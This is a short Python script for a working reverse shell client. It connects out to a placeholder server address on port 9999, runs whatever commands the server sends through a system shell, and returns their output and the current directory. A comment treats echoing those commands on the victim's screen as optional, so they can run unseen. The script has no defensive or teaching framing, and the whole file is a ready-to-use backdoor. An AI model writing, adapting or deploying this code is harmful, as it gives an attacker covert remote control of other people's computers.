import socket
import os
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Host ip address here
host = "server IPv4 Address Here" 

# Port in the host where the application is running
port = 9999

# Connect to the server
s.connect((host, port))

while True:
    # Receive commands and exceute them
    data = s.recv(1024)
    if data.decode('utf-8') == 'quit':
        break
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        # Run command
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output, "utf-8")
        s.send(str.encode(output_str+os.getcwd()+"> "))
    
        # OPTIONAL!! Print on the client's computer what you're doin
        print(output_str)

